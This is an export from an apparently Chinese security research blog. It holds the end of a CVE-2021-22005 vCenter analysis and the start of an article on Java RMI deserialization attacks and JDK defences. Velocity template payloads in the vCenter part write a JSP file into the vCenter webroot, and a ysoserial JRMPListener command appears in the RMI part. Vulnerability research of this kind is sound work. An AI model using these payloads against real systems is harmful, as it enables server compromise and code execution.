class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Test &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args)throws <span class="hljs-keyword">Exception</span> &#123;<br>        <span class="hljs-built_in">new</span> Test().testMarshalIndependMapping();<br>    &#125;<br>    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> testMarshalIndependMapping() throws <span class="hljs-keyword">Exception</span> &#123;<br>        ResourceItemToJsonLdMapping resourceItemToJsonLdMapping = <span class="hljs-built_in">new</span> ResourceItemToJsonLdMapping(&quot;a&quot;, &quot;b&quot;);<br>        List&lt;MappingBuilder&lt;NamedPropertiesResourceItem, ? extends CdfAble&gt;&gt; itemMappings = <span class="hljs-built_in">new</span> ArrayList();<br>        itemMappings.<span class="hljs-keyword">add</span>(resourceItemToJsonLdMapping);<br>        ResultSetToCdfPayloadMapping resultSetToCdfPayloadMapping = <span class="hljs-built_in">new</span> ResultSetToCdfPayloadMapping(itemMappings, <span class="hljs-built_in">new</span> VelocityResourceMapping());<br>        Map&lt;String, Mappings.<span class="hljs-keyword">Wrapper</span>&lt;ResultSetToCdfPayloadMapping&gt;&gt; resultSetMappings = <span class="hljs-built_in">new</span> HashMap();<br>        <span class="hljs-keyword">Wrapper</span> <span class="hljs-keyword">wrapper</span> = <span class="hljs-built_in">new</span> <span class="hljs-keyword">Wrapper</span>(resultSetToCdfPayloadMapping);<br>        resultSetMappings.put(&quot;keykey&quot;,<span class="hljs-keyword">wrapper</span>);<br>        IndependentResultsMapping independentResultsMapping = <span class="hljs-built_in">new</span> IndependentResultsMapping(resultSetMappings);<br>        marshal(independentResultsMapping);<br>    &#125;<br><br>    private <span class="hljs-type">void</span> marshal(<span class="hljs-keyword">Object</span> o) throws <span class="hljs-keyword">Exception</span> &#123;<br>        JAXBContext jaxbContext = JAXBContext.newInstance(ResourceItemToJsonLdMapping.<span class="hljs-keyword">class</span>,IndependentResultsMapping.<span class="hljs-keyword">class</span>, ResultSetToCdfPayloadMapping.<span class="hljs-keyword">class</span>);<br>        Marshaller marshaller = jaxbContext.createMarshaller();<br>        marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, <span class="hljs-keyword">true</span>);<br>        marshaller.marshal(o, <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/68.png"></p><p>接着我们就可以到达触发模板注入的地方了</p><h3 id="3-3-Velocity模板注入"><a href="#3-3-Velocity模板注入" class="headerlink" title="3.3 Velocity模板注入"></a>3.3 Velocity模板注入</h3><blockquote><p>这部分内容是当时复现1day时的一些截图，所以只关注<mappingCode>标签内容即可</p></blockquote><p>调用链：</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/69.png"></p><p>当传递aaa 字符串时，断到<code>com.vmware.ph.phservice.collector.internal.cdf.mapping.ResourceItemToJsonLdMapping#map</code><br><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/70.png">  </p><p>在<code>com.vmware.ph.phservice.collector.internal.cdf.mapping.velocity.VelocityHelper#static()</code>装载了context变量的值：</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/71.png"></p><p>经过调试发现这里的velocity  context并不包含常见的$request、$session变量，可用变量共26个，其中大部分是string信息，最初看到testbnull师傅截图，是通过修改这个”GLOBAL-logger”下属性值_fileName达到写文件目的。开始分析下</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/72.png">  </p><p>然后开始调试：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">velocityEngine.evaluate(substitutor, dummySw, logTag, &quot;<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">log</span> = $<span class="hljs-variable">GLOBAL</span>-<span class="hljs-variable">logger</span>.<span class="hljs-variable">logger</span>.<span class="hljs-variable">parent</span>.<span class="hljs-variable">aai</span>)</span></span>##&quot;);<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/73.png">  </p><p>发现直接通过.拿不到aai这个变量，查看parent对应类<code>org.apache.log4j.spi.RootLogger</code>及其父类<code>org.apache.log4j.Logger</code>不存在该变量，在其爷爷类<code>org.apache.log4j.Category</code>找见了aai变量</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/74.png">  </p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/75.png">  </p><p>既然直接通过属性拿不到、也不能调用superClass等方法。在<code>org.apache.log4j.Category</code>类搜索aai的调用，发现<code>getAppender()</code>方法可以通过其属性<code>_delegate.name</code>直接拿到<code>com.vmware.log4j.appender.NonAppendingRollingFileAppender</code>对象,都省下用aai去寻找属性了</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/76.png">  </p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/77.png">  </p><p>而这里的<code>_delegate.name</code>为<code>LOGFILE</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/78.png">  </p><p>现在已经拿到NonAppendingRollingFileAppender对象,再调用属性<code>_fileName</code>的<code>setter</code>方法即可修改</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/79.png">  </p><p>构造语句测试：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs leaf"><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">log</span> = $<span class="hljs-variable">GLOBAL</span>-<span class="hljs-variable">logger</span>.<span class="hljs-variable">logger</span>.<span class="hljs-variable">parent</span>)</span></span>##<br><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">narfazj</span> = $<span class="hljs-variable">log</span>.<span class="hljs-variable">getAppender</span>(\<span class="hljs-string">&quot;LOGFILE\&quot;</span>)</span></span>)##<br>$narfazj.setFile(\&quot;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xxx.jsp\&quot;)<br></code></pre></td></tr></table></figure><p>调试无问题：</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/80.png">  </p><p>burp测试时发现变量已修改，但是文件并未生成</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/81.png">  </p><p>直接使用logger.info()等方法时却还是写入默认文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#set($log = $GLOBAL-logger.logger.parent)##</span><br><span class="hljs-variable">$log</span>.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;logbytest&quot;</span>)<br><span class="hljs-variable">$log</span>.<span class="hljs-built_in">debug</span>(<span class="hljs-string">&quot;logbytest&quot;</span>)<br><span class="hljs-variable">$log</span>.<span class="hljs-built_in">error</span>(<span class="hljs-string">&quot;logbytest&quot;</span>)<br><span class="hljs-variable">$log</span>.warn(<span class="hljs-string">&quot;logbytest&quot;</span>)  <br></code></pre></td></tr></table></figure><p>再次测试发现<code>_fileName</code>修改成功，但是并未创建jsp文件且日志还是写到了原来文件中</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/82.png">  </p><p>说明日志写入时并不是取的<code>_fileName</code>,后面注意到：<code>_delegate.fileName</code>变量的值也是默认<code>/var/log/vmware/analytics/analytics.log</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/83.png">  </p><p>找到<code>com.vmware.log4j.appender.NonAppendingRollingFileAppender#activateOptions()</code>会将<code>com.vmware.log4j.appender.NonAppendingRollingFileAppender#_fileName</code>的值同步给<code>_delegate.fileName</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/84.png">  </p><p>再次尝试下：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs leaf"><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">log</span> = $<span class="hljs-variable">GLOBAL</span>-<span class="hljs-variable">logger</span>.<span class="hljs-variable">logger</span>.<span class="hljs-variable">parent</span>)</span></span>##<br><span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">set</span><span class="hljs-params">($<span class="hljs-variable">narfazj</span> = $<span class="hljs-variable">log</span>.<span class="hljs-variable">getAppender</span>(<span class="hljs-string">&quot;LOGFILE&quot;</span>)</span></span>)##<br>$narfazj.setFile(&quot;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xxx.jsp&quot;)<br>$narfazj.activateOptions()<br></code></pre></td></tr></table></figure><p>发现可以写入了！</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/85.png">  </p><p>注意写完shell之后需要再恢复下fileName变量值日志<code>/var/log/vmware/analytics/analytics.log</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">set</span>(<span class="hljs-variable">$log</span> = <span class="hljs-variable">$GLOBAL</span>-logger.logger.parent)<span class="hljs-comment">##</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">set</span>(<span class="hljs-variable">$narfazj</span> = <span class="hljs-variable">$log</span>.getAppender(<span class="hljs-string">&quot;LOGFILE&quot;</span>))<span class="hljs-comment">##</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.setFile(<span class="hljs-string">&quot;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xxx.jsp&quot;</span>)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.activateOptions()</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">log.info(\&quot;&lt;%=123%&gt;\&quot;)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.setFile(<span class="hljs-string">&quot;/var/log/vmware/analytics/analytics.log&quot;</span>)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">narfazj.activateOptions()</span><br></code></pre></td></tr></table></figure><p>文章log日志调试部分图片是在分析1day时截的，所以图中的POC与上文分析不完全一致。在测试poc过程当中，断点断到了系统发的请求数据，根据这个也能很快定位到最终的resourceItemToJsonLdMapping对象进行模板注入</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/86.png"></p><p>至此完成了Vmware-Vcenter漏洞CVE-2021-22005 的追踪复现，希望对你有帮助！</p><h2 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h2><p><a href="https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee">https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee</a></p><p><a href="https://www.vmware.com/security/advisories/VMSA-2021-0020.html">https://www.vmware.com/security/advisories/VMSA-2021-0020.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞追踪</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vmware-Vcenter</tag>
      
      <tag>漏洞分析</tag>
      
      <tag>CVE-2021-22005</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论RMI的攻防演进史</title>
    <link href="/2022/Exploring-JAVA-RMI&#39;s-offensive-and-defensive-history/"/>
    <url>/2022/Exploring-JAVA-RMI&#39;s-offensive-and-defensive-history/</url>
    
    <content type="html"><![CDATA[<blockquote><p>前些日子的一次比赛碰到攻击RMI服务的漏洞，最终没打下来。当时也被其他任务缠身导致没探究其根本原因。想着近两年各种基于RMI的漏洞又多了起来，而我对其中涉及的很多JDK版本问题、官方修复绕过、分布式垃圾回收相关特性、各种tricks的利用等都懵懵懂懂。趁着假期，索性一次将RMI相关的利用问题搞清楚</p></blockquote><p>本文不涉及太多Debug代码的流水账，那样只会绕来绕去把自己绕晕。而是按照Oracle的官方修复、被绕过、修复、再绕过的思路进行分析。全文讲的RMI攻击对象为注册中心及服务端，至于反向操作造成的客户端反打问题原理类似，这里不做讨论。</p><p>针对RMI服务的利用手法依赖于目标ClassPath存在的Gadget，从JDK更新历史来看可分为三个阶段，第一阶段是在JEP290之前，攻击者可使用bind&#x2F;unbind&#x2F;dirty等操作绑定Gadget完成利用。在第二阶段是在发布JEP290(JDK8u121)至JDK8u241时期，由于JEP290 白名单的限制，进而找出了UnicastRef、UnicastRemoteObject利用链可用于二次反序列化的攻击手法，中间也穿插了对来源地址等的限制及绕过（CVE-2019-2684）。而第三阶段是在JDK8u241之后，攻击RMI服务已经无法利用bind&#x2F;unbind&#x2F;dirty等内置方法完成攻击，只能寄希望于寻找应用层的函数方法，当方法传递的是Object、Remote、Map等类型参数时，还是可以利用其传递构造的恶意对象进行利用。</p><h2 id="1、概念介绍"><a href="#1、概念介绍" class="headerlink" title="1、概念介绍"></a>1、概念介绍</h2><p>先了解下RMI相关名词RPC、RMI、JNDI、JRMP等的解释</p><p>RPC</p><blockquote><p>RPC 全称为 Remote Procedure Call(远程过程调用)，它是一种计算机通信协议，允许像调用本地服务一样去调用远程服务。RPC可以有不同的实现方式，如RMI(远程方法调用)、Hessian等。另外RPC与语言是没有关系的，Java rmi使用的是Socket通信、动态代理反射、Java原生反序列化去实现的RPC框架。即本文要讲解的重点-Java rmi</p></blockquote><p>Java RMI</p><blockquote><p>Java RMI 全程为Java Remote Method Invocation(Java 远程方法调用)。Java RMI是专门为Java提供的远程方法调用机制，远程服务器实现具体方法并提供接口，本地客户端根据接口定义，提供参数即可调用远程方法并获取执行结果，实现了跨域JVM去调用另外一个JVM的对象方法。 </p></blockquote><p>JNDI</p><blockquote><p>JNDI全称为Java Naming and Directory Interface(Java 命名与目录接口)。命名指的是在一个目录系统当中，实现了”服务名称-对象&#x2F;引用”这样的映射对应关系，当客户端根据名称即可查询到相关联的对象&#x2F;引用。目录是一种特殊类型的命名服务，在命名的基础上增加了“属性”的概念，所以客户端也可以根据对象属性操作筛选对象&#x2F;引用。这些对象&#x2F;引用可以存储在不同的命名&#x2F;目录服务当中，如上面提到的远程服务调用RMI、公共对象请求代理架构CORBA、轻量级目录访问协议LDAP、域名服务DNS</p></blockquote><p>JRMP</p><blockquote><p>JRMP全称为Java Remote Method Protocal（Java 远程方法协议）。Java本身对于RMI的实现默认使用JRMP协议，而最近几年的漏洞之王-Weblogic对于RMI的实现使用的是T3协议。一次Java RMI的过程，需要用到JRMP协议去组织数据格式然后通过TCP协议进行传输，达到远程方法调用的目的</p></blockquote><p>2、RMI调用基本流程</p><blockquote><p>一次完整的RMI调用涉及到注册中心Registry、服务端Server、客户端Client三端，服务端首先向注册中心注册创建的远程对象（下图第一二步），接着客户端向注册中心发起查找请求并拿到远程对象的存根（下图第三四步）。RMI的实现引入了Stubs(客户端存根)、Skeletons(服务端骨架)两个概念。当客户端调用远程服务端的对象方法时（下图第五步），实际上会先经过“远程对象的客户本地代理”，这个代理类就是Stubs(客户端存根)，其主要负责将要调用的远程方法名及参数打包、并将该包转发给远程对象所在的服务器（下图第六步）；而在远程服务器调用真正的方法之前，同样也会经过代理类，这个存在于服务端的代理类就是骨架Skeleton，它从Stubs中接受调用并传递给真实的目标方法（下图第七步）。两者对于RMI服务的使用者是隐藏的，使用者不需要关注这部分实现。如下图是一次RMI的调用过程</p></blockquote><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/1.png"></p><p>了解了RMI的调用过程，我们还需要知道：RMI过程中传输的数据均为序列化数据，服务端&#x2F;客户端&#x2F;注册中心在拿到数据后都会进行反序列化操作。如果传输的是我们构造好的恶意序列化数据，就会在反序列化时触发漏洞。关于RMI的大部分攻击都是基于此特性完成的，主要分为：服务端向注册中心的bind操作、客户端向注册中心的lookup操作、客户端向服务端调用“自定义方法”的操作。漏洞利用在此基础上完成。本文主要讨论的是对于注册中心&#x2F;服务端的漏洞利用在JDK中的的攻防历史，涉及多个JDK版本、反序列化Gadget构造技巧、官方的修复与绕过等等知识。</p><p>文章中使用的JDK版本：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">jdk8u112、jdk8u121、jdk8u141、jdk8u191、jdk8u231、jdk8u241<br></code></pre></td></tr></table></figure><h2 id="2、JAVA-RMI与JDK的攻防史"><a href="#2、JAVA-RMI与JDK的攻防史" class="headerlink" title="2、JAVA RMI与JDK的攻防史"></a>2、JAVA RMI与JDK的攻防史</h2><h3 id="1、jdk-lt-8u121-无任何过滤"><a href="#1、jdk-lt-8u121-无任何过滤" class="headerlink" title="1、jdk&lt; 8u121 无任何过滤"></a>1、jdk&lt; 8u121 无任何过滤</h3><h4 id="1-1-bind-x2F-rebind-的利用"><a href="#1-1-bind-x2F-rebind-的利用" class="headerlink" title="1.1 bind&#x2F;rebind 的利用"></a>1.1 bind&#x2F;rebind 的利用</h4><p>服务端使用bind向注册中心注册绑定远程对象，我们可以放置恶意对象完成利用</p><p>sun.rmi.registry.RegistryImpl_Skel#dispatch</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/2.png"></p><p>注册中心端的RegistryImpl_Skel会直接对服务端 bind&#x2F;rebind操作传输过来的对象进行反序列化而没有任何过滤。所以在JDK8u121之前可以直接使用bind&#x2F;rebind操作传输恶意对象进行漏洞利用。这也是ysoserial.exploit.RMIRegistryExploit 利用的原理。因为bind传输的类必须实现Remote接口，可使用动态代理的方式进行解决，ysoserial使用的handler为AnnotationInvocationHandler</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/3.png"></p><h4 id="1-2-DGC-dirty-的利用"><a href="#1-2-DGC-dirty-的利用" class="headerlink" title="1.2 DGC#dirty 的利用"></a>1.2 DGC#dirty 的利用</h4><p>因为在跨虚拟机的情况下，RMI无法直接使用原有JDK的GC机制，而自己实现了DGC（Distributed  Garbage Collection 分布式垃圾回收），在对RMI进行漏洞利用的时候，也会出现经常出现DGC的身影。与上面RMI流程图中提到的一样，DGC也具有Stubs(客户端存根)、Skeletons(服务端骨架)两个概念，涉及的类为：DGCImpl_Stub、DGCImpl_Skel。并且只要启动了RMI服务，那么一定会存在DGC，其传输的数据是序列化数据，参数ObjID为Object类型，可以放置我们的恶意payload。在ysoserial中，DGC对应的利用exp为ysoserial&#x2F;exploit&#x2F;JRMPClient，以下为细节分析</p><p>处理DGC操作的是sun.rmi.transport.DGCImpl_Skel#dispatch方法</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/4.png"></p><p>根据传入的var3值决定是调用clean（0）操作还是dirty（1）操作，在调用真正的远程方法之前会使用readObject()获取参数值，即进行反序列化操作，这也是该漏洞的触发点。而EXP编写的重点是如何把我们构造的恶意序列化数据塞进去。这涉及到DGC通信的一些协议格式，我们要解决的问题本质上来说就是：<strong>模仿客户端通信，将构造的恶意数据塞入数据流，使得服务端通过反序列化操作获取ObjID参数值时触发漏洞</strong>。并且由于DGC对于RMI使用用户来说并不可见，无法像registry可以直接连接去调用内置方法，而是需要自己起socket请求，按照数据格式进行数据填充。</p><p>参考<a href="https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html">rmi-protocol-docs</a>发送的报文格式如下。服务端在接收到客户端传输的数据后，依次解析确认operation指令(Call、Ping、DgcAck)、根据ObjID确认处理的Skel类(RegistryImpl_Skel&#x2F;DGCImpl_Skel&#x2F;自定义)、根据num&#x2F;hash确认要调用的方法、arg为调用方法的参数值。其中ObjID、num、hash、arg都是基于JAVA原生序列化机制生成的序列化数据</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/5.png"></p><p>Header默认值部分在TransportConstants中定义，其中文档中的<code>0x4a 0x52 0x4d 0x49</code> 即sun.rmi.transport.TransportConstants#Magic的值</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/6.png"></p><p>operation:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Call</span>:<span class="hljs-number">80</span> <span class="hljs-number">0</span>x50 远程方法调用<br><span class="hljs-attribute">Ping</span>:<span class="hljs-number">82</span> <span class="hljs-number">0</span>x52  探测存活请求<br><span class="hljs-attribute">DgcAck</span>:<span class="hljs-number">84</span> <span class="hljs-number">0</span>x54 dgc确认请求<br></code></pre></td></tr></table></figure><p>ObjID：Registry与DGC的ObjID是固定值，在如下函数中被定义</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">Registry<br>rt<span class="hljs-selector-class">.jar</span>!sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span><span class="hljs-selector-class">.RegistryImpl</span><span class="hljs-selector-id">#id</span>:id = new <span class="hljs-built_in">ObjID</span>(<span class="hljs-number">0</span>);<br><br>DGC<br>rt<span class="hljs-selector-class">.jar</span>!sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCImpl</span><span class="hljs-selector-id">#dgcID</span>:dgcID = new <span class="hljs-built_in">ObjID</span>(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>num：Registry与DGC中的操作及对应值</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Registry</span>:<br><span class="hljs-attribute">bind</span>   <span class="hljs-number">0</span><br><span class="hljs-attribute">list</span>   <span class="hljs-number">1</span><br><span class="hljs-attribute">lookup</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">rebind</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">unbind</span> <span class="hljs-number">4</span><br><br><span class="hljs-attribute">DGC</span>:<br><span class="hljs-attribute">clean</span>  <span class="hljs-number">0</span><br><span class="hljs-attribute">dirty</span>  <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>hash：Registry与DGC中hash值为固定值，自定义方法的hash值为方法签名的sha1</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Registry:<br>sun.rmi.registry.RegistryImpl_Skel#<span class="hljs-built_in">int</span>erfaceHash:<span class="hljs-built_in">int</span>erfaceHash = <span class="hljs-number">4905912898345647071</span>L;<br><br>DGC:<br>sun.rmi.transport.DGCImpl_Skel#<span class="hljs-built_in">int</span>erfaceHash:<span class="hljs-built_in">int</span>erfaceHash = <span class="hljs-number">-669196253586618813</span>L;<br></code></pre></td></tr></table></figure><p>sun.rmi.server.UnicastServerRef#dispatch 根据客户端传过来的num值进行判断，如果≥0，表示为Registry&#x2F;DGC默认方法 调用sun.rmi.server.UnicastServerRef#oldDispatch进行处理，如果客户端想远程调用自定义方法，则需要在定义时将属性值num设为负值、服务端在接收到客户端发送的call指令后根据num及<code>hashToMethod_Map.get(方法hash值)</code>确认目标方法，最后通过反射进行调用</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/7.png"></p><p>而arg为远程方法的参数值，是基于JAVA原生序列化机制生成的序列化数据。在DGC层clean&#x2F;dirty方法的ObjID参数为Object类型，可以承载我们的恶意payload，其对应的EXP为ysoserial.exploit.JRMPClient，数据构造部分在makeDGCCall()中</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/8.png"></p><p>至此即可通过DGC攻击RMI服务</p><h3 id="2、jdk-x3D-8u121-（JEP290）"><a href="#2、jdk-x3D-8u121-（JEP290）" class="headerlink" title="2、jdk &#x3D; 8u121 （JEP290）"></a>2、jdk &#x3D; 8u121 （JEP290）</h3><p>在jdk&#x3D;8u121的时候，ORACLE官方做了两件事情。分别影响的是”远程加载类攻击客户端手法“、”对注册中心及DGC的反序列化攻击手法（加上了全局白名单）“。JEP290对于Java原生反序列化的影响暂不讨论，本文主要分析JEP290对RMI Registry、RMI DGC等攻击利用方式的影响。</p><h4 id="2-1-限制1：RMI-Registry、RMI-DGC-增加了反序列化白名单"><a href="#2-1-限制1：RMI-Registry、RMI-DGC-增加了反序列化白名单" class="headerlink" title="2.1 限制1：RMI Registry、RMI DGC 增加了反序列化白名单"></a>2.1 限制1：RMI Registry、RMI DGC 增加了反序列化白名单</h4><p>RMI Registry(注册表)、RMI DGC（分布式垃圾收集器）都默认启用了反序列化filter机制，只允许反序列化白名单中的特定类。这两者与我们对于RMI服务的攻击利用息息相关。</p><p>a.RMI Registry内置了白名单过滤器，只允许在注册表中绑定（bind）白名单中的类的实例</p><p>其验证逻辑在sun&#x2F;rmi&#x2F;registry&#x2F;RegistryImpl.java#registryFilter。另外可以自行编辑<code>sun.rmi.registry.registryFilter</code>系统属性配置黑白名单为RMI注册表增加额外保护</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/9.png"></p><p>b.RMI DGC与RMI Registry类似，也内置了反序列化的白名单，包括：<code>java.rmi.server.ObjID</code>、<code>java.rmi.server.UID</code>、<code>java.rmi.dgc.VMID</code>和<code>java.rmi.dgc.Lease</code>。这部分逻辑写在sun.rmi.transport.DGCImpl#checkInput</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/10.png"></p><h4 id="2-2-限制2：限制了-RMI-远程加载机制"><a href="#2-2-限制2：限制了-RMI-远程加载机制" class="headerlink" title="2.2  限制2：限制了 RMI 远程加载机制"></a>2.2  限制2：限制了 RMI 远程加载机制</h4><p>JDK RMI的远程Reference信任机制变化：环境变量com.sun.jndi.rmi.object.trustURLCodebase默认为false，意味着我们不能通过rmi的JNDI方式去攻击客户端了</p><p>有关JNDI注入修复及绕过分析可参考之前文章：<a href="https://pwnull.github.io/2022/jndi-injection-history/">当我们谈论JNDI注入时，我们在谈论什么</a></p><h4 id="2-3-绕过1：使用JEP290白名单中的UnicastRef完成绕过"><a href="#2-3-绕过1：使用JEP290白名单中的UnicastRef完成绕过" class="headerlink" title="2.3 绕过1：使用JEP290白名单中的UnicastRef完成绕过"></a>2.3 绕过1：使用JEP290白名单中的UnicastRef完成绕过</h4><p>总结：<strong>JEP290是对RMI Registry与RMI DGC做的白名单限制，并没有对JRMP回连逻辑做限制，而白名单中的UnicastRef类会建立JRMP请求并对返回数据做反序列化处理，所以导致二次反序列化问题</strong></p><p>JEP290 加上了反序列化白名单：sun&#x2F;rmi&#x2F;registry&#x2F;RegistryImpl.java#registryFilter</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">String</span><br><span class="hljs-built_in">Number</span><br>Remote<br><span class="hljs-built_in">Proxy</span><br>UnicastRef<br>RMIClientSocketFactory<br>RMIServerSocketFactory<br>ActivationID<br>UID<br></code></pre></td></tr></table></figure><p>前辈在白名单中找到UnicastRef类，此类的readExternal()方法会构建LiveRef对象（用于建立JRMP连接），sun.rmi.registry.RegistryImpl_Skel调用dispatchsun.rmi.transport.StreamRemoteCall#releaseInputStream释放输入流的时候会建立JRMP连接，并从数据流中取出数据进行反序列化操作，所以我们可利用JEP290白名单中的UnicastRef类进行一个二次反序列化绕过限制。利用思路如下：</p><h5 id="2-3-1-UnicastRef-链利用复现"><a href="#2-3-1-UnicastRef-链利用复现" class="headerlink" title="2.3.1 UnicastRef 链利用复现"></a>2.3.1 UnicastRef 链利用复现</h5><p>1、攻击者搭建恶意JRMP服务器，并放置构造的恶意序列数据等待目标服务器来取。这部分逻辑对应ysoserial.exploit.JRMPListener类，使用命令为</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-cp ysoserial.<span class="hljs-keyword">jar </span>ysoserial.exploit.<span class="hljs-keyword">JRMPListener </span><span class="hljs-number">9999</span> CommonsBeanutils1 <span class="hljs-string">&quot;mspaint&quot;</span><br></code></pre></td></tr></table></figure><p>2、RMI 